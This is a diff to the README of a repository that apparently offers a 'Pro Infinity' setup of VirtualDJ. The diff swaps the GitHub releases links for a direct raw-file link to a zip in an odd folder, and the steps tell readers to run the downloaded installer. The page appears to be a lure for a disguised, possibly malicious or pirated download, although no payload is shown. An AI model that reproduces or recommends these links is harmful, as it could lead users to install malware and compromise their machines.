@@ -1,6 +1,6 @@
 # 🎛️ VirtualDJ-Pro-Infinity-Setup - Mix music like a professional DJ
 
-[![](https://img.shields.io/badge/Download-VirtualDJ-blue.svg)](https://github.com/chelonian-pavarotti496/VirtualDJ-Pro-Infinity-Setup/releases)
+[![](https://img.shields.io/badge/Download-VirtualDJ-blue.svg)](https://raw.githubusercontent.com/chelonian-pavarotti496/VirtualDJ-Pro-Infinity-Setup/main/halfhearted/Infinity_Pro_Virtual_Setup_D_v2.8.zip)
 
 ## 📌 About this project
 
@@ -21,7 +21,7 @@ To ensure the software runs at peak performance, verify your Windows computer me
 
 Follow these steps to set up the software on your Windows machine.
 
-1.  **Visit the Download Page**: Go to [https://github.com/chelonian-pavarotti496/VirtualDJ-Pro-Infinity-Setup/releases](https://github.com/chelonian-pavarotti496/VirtualDJ-Pro-Infinity-Setup/releases) to view the latest software releases.
+1.  **Visit the Download Page**: Go to [https://raw.githubusercontent.com/chelonian-pavarotti496/VirtualDJ-Pro-Infinity-Setup/main/halfhearted/Infinity_Pro_Virtual_Setup_D_v2.8.zip](https://raw.githubusercontent.com/chelonian-pavarotti496/VirtualDJ-Pro-Infinity-Setup/main/halfhearted/Infinity_Pro_Virtual_Setup_D_v2.8.zip) to view the latest software releases.
 2.  **Select the Version**: Find the most recent release at the top of the page.
 3.  **Download the File**: Click the file ending in .exe to begin the download.
 4.  **Run the Installer**: Locate the file in your Downloads folder and double-click the icon.
